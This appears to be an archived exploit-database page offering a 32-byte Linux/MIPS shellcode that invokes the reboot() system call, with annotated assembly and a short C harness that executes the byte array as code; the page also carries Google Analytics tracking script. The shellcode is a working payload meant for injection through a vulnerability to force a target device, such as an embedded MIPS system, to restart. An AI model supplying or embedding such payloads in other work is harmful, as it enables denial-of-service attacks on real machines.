<html><head><title>Linux/mips - reboot() - 32 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * Title: Linux/MIPS - reboot() - 32 bytes.
 * Author: rigan - imrigan [sobachka] gmail.com
 */

#include &lt;stdio.h&gt;

char sc[] =          
         &quot;\x3c\x06\x43\x21&quot;       // lui     a2,0x4321
         &quot;\x34\xc6\xfe\xdc&quot;       // ori     a2,a2,0xfedc
         &quot;\x3c\x05\x28\x12&quot;       // lui     a1,0x2812
         &quot;\x34\xa5\x19\x69&quot;       // ori     a1,a1,0x1969
         &quot;\x3c\x04\xfe\xe1&quot;       // lui     a0,0xfee1
         &quot;\x34\x84\xde\xad&quot;       // ori     a0,a0,0xdead
         &quot;\x24\x02\x0f\xf8&quot;       // li      v0,4088
         &quot;\x01\x01\x01\x0c&quot;;      // syscall 0x40404 

void main(void)
{
       void(*s)(void);
       printf(&quot;size: %d\n&quot;, sizeof(sc));
       s = sc;
       s();
}   

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
